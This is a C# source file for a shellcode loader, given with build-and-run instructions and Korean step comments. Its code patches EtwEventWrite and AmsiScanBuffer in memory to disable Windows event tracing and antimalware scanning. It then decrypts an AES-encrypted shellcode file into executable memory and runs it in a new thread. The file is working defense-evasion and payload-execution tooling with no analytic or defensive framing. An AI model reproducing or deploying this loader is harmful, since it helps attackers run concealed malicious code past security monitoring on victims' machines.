// Loader.cs
// Usage: csc /platform:x86 /out:loader.exe Loader.cs && loader.exe encrypted.bin

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class NativeShellcodeLoader
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    static void PatchETW()
    {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        if (etwEventWrite != IntPtr.Zero)
        {
            uint oldProtect;
            VirtualProtect(etwEventWrite, (UIntPtr)4, 0x40, out oldProtect);
            Marshal.Copy(new byte[] { 0xC3, 0x90, 0x90, 0x90 }, 0, etwEventWrite, 4); // ret; nop; nop; nop
            VirtualProtect(etwEventWrite, (UIntPtr)4, oldProtect, out _);
        }
    }

    static void PatchAMSI()
    {
        IntPtr amsi = GetModuleHandle("amsi.dll");
        IntPtr scanBuf = GetProcAddress(amsi, "AmsiScanBuffer");
        if (scanBuf != IntPtr.Zero)
        {
            uint oldProtect;
            VirtualProtect(scanBuf, (UIntPtr)6, 0x40, out oldProtect);
            Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, scanBuf, 6); // mov eax,0x80070057; ret
            VirtualProtect(scanBuf, (UIntPtr)6, oldProtect, out _);
        }
    }

    static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("Usage: loader.exe <encrypted_shellcode.bin>");
            return;
        }

        // 1. ETW/AMSI 패치
        PatchETW();
        PatchAMSI();

        // 2. 암호화된 Shellcode 복호화
        byte[] enc = File.ReadAllBytes(args[0]);
        byte[] key = new byte[32], iv = new byte[16];
        Array.Copy(enc, 0, key, 0, 32);
        Array.Copy(enc, 32, iv, 0, 16);
        byte[] shellcode = Decrypt(enc, 48, key, iv);

        // 3. Manual Mapping (VirtualAlloc + Copy)
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // 4. Reflective 실행 (CreateThread)
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    static byte[] Decrypt(byte[] data, int offset, byte[] key, byte[] iv)
    {
        using var aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        return aes.CreateDecryptor().TransformFinalBlock(data, offset, data.Length - offset);
    }
}
